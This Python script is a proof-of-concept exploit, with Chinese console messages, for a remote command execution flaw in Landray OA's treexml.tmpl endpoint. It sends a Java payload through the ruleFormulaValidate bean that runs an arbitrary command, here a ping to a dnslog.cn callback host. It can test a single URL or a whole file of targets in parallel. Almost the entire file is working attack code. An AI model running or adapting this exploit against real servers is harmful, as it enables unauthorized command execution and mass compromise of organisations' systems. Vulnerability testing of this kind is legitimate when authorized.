import time
import argparse
import requests
import multiprocessing
import urllib3
from rich.console import Console



console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

proxies={'http':'http://127.0.0.1:8080'}
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        
        }
    console.print(now_time() + " [INFO]     正在检测蓝凌OA_treeXml_远程命令执行", style='bold blue')
    data='''s_bean=ruleFormulaValidate&script=try {
String cmd = "ping 123456.0d7a20.dnslog.cn";
Process child = Runtime.getRuntime().exec(cmd);
} catch (IOException e) {
System.err.println(e);
}'''
    exp_url = target_url+'data/sys-common/treexml.tmpl'
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.post(exp_url, headers=headers,data=data, verify=False)
        if respones.status_code == 200:
            console.print(now_time() + ' [SUCCESS]  蓝凌OA_treeXml_远程命令执行存在', style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  蓝凌OA_treeXml_远程命令执行可能不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
   
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
            
